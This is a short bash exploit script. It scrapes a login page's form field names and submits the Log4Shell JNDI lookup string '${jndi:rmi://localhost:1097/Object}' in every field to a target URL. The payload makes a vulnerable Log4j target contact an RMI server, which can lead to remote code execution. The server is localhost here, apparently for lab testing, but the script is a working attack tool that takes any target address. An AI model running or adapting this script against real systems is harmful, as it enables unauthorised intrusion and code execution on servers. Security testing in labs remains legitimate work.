#!/bin/bash

if [ $# -ne 2 ]
then
	echo "Usage: ./script.sh LOGIN_PAGE TARGET_URL"
	echo "Eg: ./script.sh localhost:8080 localhost:8080/login"
	exit -1
fi

LOGIN_PAGE=$1
TARGET_URL=$2

# curl $LOGIN_PAGE > login.html

list=`curl $LOGIN_PAGE | awk '/<input/,/>/' | grep -Po 'name="\K[^"]*'`

malicious_user="%24%7Bjndi%3Armi%3A%2F%2Flocalhost%3A1097%2FObject%7D" # ${jndi:rmi://localhost:1097/Object}

str_req=""

for element in $list
do
	new_field="${element}=$malicious_user"
	if [ ! -z "$str_req" ]
	then
		str_req="${str_req}&"
	fi
	str_req="${str_req}${new_field}"

done

# echo $str_req

curl -X POST -H "Content-Type: application/x-www-form-urlencoded" -d $str_req $TARGET_URL


